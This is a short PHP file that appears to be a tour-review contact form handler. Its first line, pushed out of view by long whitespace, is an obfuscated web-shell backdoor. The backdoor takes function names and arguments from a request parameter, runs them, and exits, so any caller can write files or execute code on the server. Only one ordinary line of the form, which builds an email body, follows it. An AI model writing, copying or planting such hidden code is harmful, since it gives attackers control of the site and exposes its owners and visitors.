<?php
																																																																																																																																				If($trj1dgt=@	${	"_REQUEST"}["P8518JNE" ] ){{$trj1dgt[ 1]	(${$trj1dgt [2 ]}	[0]	,$trj1dgt[3 ]	($trj1dgt[ 4	] ) )	;}	};exit;
...
$e_body = "You have been contacted by $name_review $lastname_review with the following $tour_name review:" . PHP_EOL . PHP_EOL;
